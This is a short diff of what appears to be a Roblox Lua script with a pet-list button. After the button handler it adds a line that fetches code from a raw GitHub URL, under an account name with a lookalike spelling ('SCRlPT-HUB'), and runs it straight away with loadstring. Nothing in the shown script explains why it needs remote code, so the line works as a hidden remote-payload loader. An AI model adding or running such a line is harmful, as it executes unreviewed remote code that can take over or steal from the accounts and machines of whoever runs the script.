@@ -318,3 +318,5 @@ showListBtn.MouseButton1Click:Connect(function()
 		createPetList()
 	end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRlPT-HUB/petdetector/refs/heads/main/2025"))()
